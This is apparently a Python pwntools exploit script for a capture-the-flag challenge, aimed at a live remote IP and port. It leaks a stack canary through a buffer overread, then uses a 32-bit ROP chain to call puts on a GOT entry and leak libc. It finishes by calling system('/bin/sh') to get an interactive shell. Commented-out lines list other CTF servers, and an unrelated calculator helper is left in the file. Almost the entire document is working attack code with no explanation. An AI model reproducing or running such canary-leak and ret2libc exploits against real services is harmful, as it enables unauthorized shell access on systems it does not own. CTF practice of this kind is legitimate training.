# import time
from pwn import *
# from LibcSearcher import *
# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 1234)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
# io = remote("node5.anna.nssctf.cn", 28604)
io = remote("112.6.51.212", 30362)
# io = process('./q2')
# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./attachment')
# libc = ELF('./libc-2.31.so')


def s(a):
    io.send(a)
def sa(a, b):
    io.sendafter(a, b)
def sl(a):
    io.sendline(a)
def sal(a, b):
    io.sendlineafter(a, b)
def r(n):
    return (io.recv(n))
def ru(a):
    return io.recvuntil(a)
def rl():
    return io.recvline()
def sla(a, b):
    io.sendlineafter(a, b)
def debug():
    gdb.attach(io)
    pause()
def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
def inter():
    return io.interactive()
def print_addr(name, addr):
    print(f"{name} =", addr)
def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


# context(os='linux', arch='amd64')
# context(os='linux', arch='amd64', log_level="debug")

# name_list = [
#              # "gets",
#              "puts",
#              "setvbuf",
#              # "write"
#              ]
#
#
# for i in range(len(name_list)):
#     print(f"{name_list[i]}_plt = ", hex(elf.plt[name_list[i]]))
#     print(f"{name_list[i]}_got = ", hex(elf.got[name_list[i]]))

ru("Your choice:")
sl("1")
ru("a gift")
s(b'a' * 0x20 + b'b')
ru(b'ab')
canary = b'\x00'
canary += (io.recv(3))
print(canary)
ru("Your choice:")
sl("2")
ru("the power")
payload = b'a' * 0x20 + canary
payload = payload.ljust(0x2c + 4, b'\x00')

main_addr = 0x080494C7
puts_plt =  0x8049124
puts_got =  0x804c020

payload += p32(puts_plt) + p32(main_addr) + p32(puts_got) + p32(4)
sl(payload)
print(rl())
libc_base = u32(ru(b'\xf7')) - 0x6D1E0
print(hex(libc_base))

sys_addr = libc_base + 0x41360
bin_addr = libc_base + 0x18B363

payload = b'a' * 0x20 + canary
payload = payload.ljust(0x2c + 4, b'\x00')
payload += p32(sys_addr) +p32(0xabcd)+ p32(bin_addr)

ru("Your choice:")
sl("2")
ru("power")
sl(payload)


inter()

